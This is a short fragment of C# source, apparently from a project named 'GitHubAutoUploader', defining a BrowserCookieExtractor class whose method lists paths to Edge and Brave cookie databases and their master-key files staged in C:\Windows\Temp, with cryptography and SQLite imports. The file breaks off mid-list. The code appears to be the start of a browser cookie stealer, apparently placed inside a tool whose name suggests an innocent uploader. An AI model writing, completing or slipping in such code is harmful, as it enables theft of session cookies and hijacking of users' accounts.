using System.Security.Cryptography;
using System.Text;
using Microsoft.Data.Sqlite;

namespace GitHubAutoUploader;

public static class BrowserCookieExtractor
{
      public static async Task<string?> ExtractAndSave(string outputPath)
      {
                var candidates = new[]
                {
                              (@"C:\Windows\Temp\edge_cookies.db", @"C:\Windows\Temp\edge_master_key.bin", "Edge"),
                              (@"C:\Windows\Temp\brave_cookies.db", @"C:\Windows\Temp\brave_master_key.bin", "Brave"),
                              (@"C:\Win
